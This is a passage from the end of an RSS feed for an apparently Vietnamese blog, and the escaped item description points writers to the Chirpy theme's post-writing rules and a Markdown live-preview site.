href=&#34;https://chirpy.cotes.page/posts/write-a-new-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;rule&lt;/strong&gt;&lt;/a&gt; để viết blog của themes và sử dụng &lt;a href=&#34;https://markdownlivepreview.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Live Preview&lt;/strong&gt;&lt;/a&gt; để quan sát&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
